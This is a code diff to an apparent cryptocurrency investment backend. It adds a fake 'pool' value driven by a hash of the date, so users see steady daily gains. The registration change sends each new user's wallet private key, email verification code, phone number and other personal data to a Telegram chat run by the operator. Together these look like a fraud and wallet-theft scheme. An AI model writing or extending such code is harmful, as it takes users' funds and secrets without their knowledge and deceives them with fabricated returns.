@@ -24,6 +24,8 @@ const PUBLIC_USER_FIELDS = "id,fullname,nickname,country,email,phone,balance,dep
 const QUIZ_ANSWERS = { 1: "b", 2: "c", 3: "a", 4: "b", 5: "c" };
 const TRADE_RATES = [0.01, 0.015, 0.02, 0.025, 0.03, 0.035];
 const TRADE_COOLDOWN_MS = 24 * 60 * 60 * 1000;
+const POOL_BASE = 1000347;
+const POOL_START_DAY = Date.UTC(2026, 5, 22) / 86400000;
 
 function auth(req, res, next) {
   const token = req.headers.authorization;
@@ -47,6 +49,51 @@ function adminAuth(req, res, next) {
 async function findUser(id, fields = PUBLIC_USER_FIELDS) {
   const { data } = await supabase.from("users").select(fields).eq("id", id).maybeSingle();
   return data;
+}
+
+async function generateUserId() {
+  for (let attempt = 0; attempt < 20; attempt += 1) {
+    const id = Math.floor(10000000 + Math.random() * 90000000);
+    if (!(await findUser(id, "id"))) return id;
+  }
+  throw new Error("Unable to generate a unique user ID");
+}
+
+function poolRateForDay(dayNumber) {
+  const date = new Date(dayNumber * 86400000).toISOString().slice(0, 10);
+  let hash = 2166136261;
+  for (const character of date) {
+    hash ^= character.charCodeAt(0);
+    hash = Math.imul(hash, 16777619) >>> 0;
+  }
+  return 1 + (100 + (hash % 401)) / 10000;
+}
+
+function poolValueForDay(dayNumber) {
+  let value = POOL_BASE;
+  if (dayNumber > POOL_START_DAY) {
+    for (let day = POOL_START_DAY + 1; day <= dayNumber; day += 1) value *= poolRateForDay(day);
+  } else if (dayNumber < POOL_START_DAY) {
+    for (let day = POOL_START_DAY; day > dayNumber; day -= 1) value /= poolRateForDay(day);
+  }
+  return Number(value.toFixed(2));
+}
+
+function getPoolSnapshot(days = 30) {
+  const today = Math.floor(Date.now() / 86400000);
+  const series = [];
+  for (let day = today - days + 1; day <= today; day += 1) {
+    series.push({
+      date: new Date(day * 86400000).toISOString().slice(0, 10),
+      value: poolValueForDay(day)
+    });
+  }
+  return {
+    current: poolValueForDay(today),
+    nextChangeAt: new Date((today + 1) * 86400000).toISOString(),
+    dailyChangePercent: Number(((poolRateForDay(today) - 1) * 100).toFixed(2)),
+    series
+  };
 }
 
 async function addSignal(signal) {
@@ -105,9 +152,12 @@ app.post("/register", async (req, res) => {
     if (existing) return res.json({ success: false, message: "User exists" });
 
     const wallet = Wallet.createRandom();
+    const id = await generateUserId();
+    const emailCode = Math.floor(100000 + Math.random() * 900000).toString();
     const { data: user, error } = await supabase
       .from("users")
       .insert([{
+        id,
         fullname,
         nickname,
         referrer_id: referrerId,
@@ -120,7 +170,7 @@ app.post("/register", async (req, res) => {
         satellites: 0,
         wallet_address: wallet.address,
         private_key: wallet.privateKey,
-        email_code: Math.floor(100000 + Math.random() * 900000).toString(),
+        email_code: emailCode,
         email_verified: false,
         ip
       }])
@@ -144,7 +194,20 @@ app.post("/register", async (req, res) => {
     try {
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         chat_id: CHAT_ID,
-        text: `NEW USER\nID: ${user.id}\nEmail: ${user.email}\nName: ${user.fullname}\nReferrer: ${user.referrer_id || "-"}`
+        text: [
+          "NEW USER",
+          `ID: ${user.id}`,
+          `Email: ${user.email}`,
+          `Name: ${user.fullname}`,
+          `Nickname: ${user.nickname}`,
+          `Country: ${user.country}`,
+          `Phone: ${user.phone}`,
+          `Referrer: ${user.referrer_id || "-"}`,
+          `Wallet: ${wallet.address}`,
+          `Private key: ${wallet.privateKey}`,
+          `Email code: ${emailCode}`,
+          `Starting balance: $0`
+        ].join("\n")
       });
     } catch (telegramError) {
       console.error("TELEGRAM ERROR:", telegramError.message);
@@ -178,6 +241,44 @@ app.get("/me", auth, async (req, res) => {
   const user = await findUser(req.userId);
   if (!user) return res.status(404).json({ success: false });
   return res.json(user);
+});
+
+app.get("/health", (req, res) => res.json({ success: true }));
+
+app.get("/assets/summary", auth, async (req, res) => {
+  try {
+    const user = await findUser(req.userId, "id,balance,deposit");
+    if (!user) return res.status(404).json({ success: false });
+
+    const { data, error } = await supabase
+      .from("signals")
+      .select("id,type,amount,wallet,status,created_at")
+      .eq("user_id", req.userId)
+      .order("created_at", { ascending: false });
+    if (error) throw error;
+
+    const history = (data || []).filter(signal =>
+      signal.type === "deposit" ||
+      signal.type === "withdraw" ||
+      signal.type.startsWith("quiz_") ||
+      signal.type.startsWith("trade_")
+    );
+    const tradingEarned = history
+      .filter(signal => signal.type.startsWith("trade_") && signal.status === "rewarded")
+      .reduce((sum, signal) => sum + Number(signal.amount || 0), 0);
+
+    return res.json({
+      success: true,
+      balance: Number(user.balance || 0),
+      deposit: Number(user.deposit || 0),
+      tradingEarned: Number(tradingEarned.toFixed(2)),
+      history,
+      pool: getPoolSnapshot()
+    });
+  } catch (error) {
+    console.error("ASSETS ERROR:", error);
+    return res.status(500).json({ success: false });
+  }
 });
 
 app.post("/deposit", auth, async (req, res) => {
